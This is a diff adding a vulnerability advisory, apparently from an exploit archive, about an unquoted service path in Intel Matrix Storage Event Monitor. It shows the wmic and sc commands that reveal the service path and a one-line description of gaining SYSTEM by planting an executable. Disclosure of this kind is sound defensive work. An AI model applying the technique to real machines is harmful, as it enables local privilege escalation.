@@ -1,0 +1,41 @@
+# Exploit Title: Intel(R) Matrix Storage Event Monitor x86 8.0.0.1039 - 'IAANTMON' Unquoted Service Path
+# Date: 2021-01-04
+# Exploit Author: Geovanni Ruiz
+# Vendor Homepage: https://www.intel.com
+# Software Version: 8.0.0.1039
+# File Version: 8.0.0.1039
+# Tested on: Microsoft® Windows Vista Business 6.0.6001 Service Pack 1 x64es
+
+# 1. To find the unquoted service path vulnerability
+
+C:\>wmic service where 'name like "%IAANTMON%"' get name, displayname,
+pathname, startmode, startname
+
+DisplayName                             Name    PathName
+                                              StartMode  StartName
+Intel(R) Matrix Storage Event Monitor  IAANTMON C:\Program Files
+(x86)\Intel\Intel Matrix Storage Manager\IAANTMon.exe   Auto
+LocalSystem
+
+# 2. To check service info:
+
+C:\>sc qc "IAANTMON"
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: IAANTMON
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\Intel\Intel Matrix
+Storage Manager\IAANTMon.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : Intel(R) Matrix Storage Event Monitor
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+# 3. Exploit:
+
+To exploit this vulnerability an attacker requires to drop a malicious
+executable into the service path undetected by the OS in order
+to gain SYSTEM privileges.
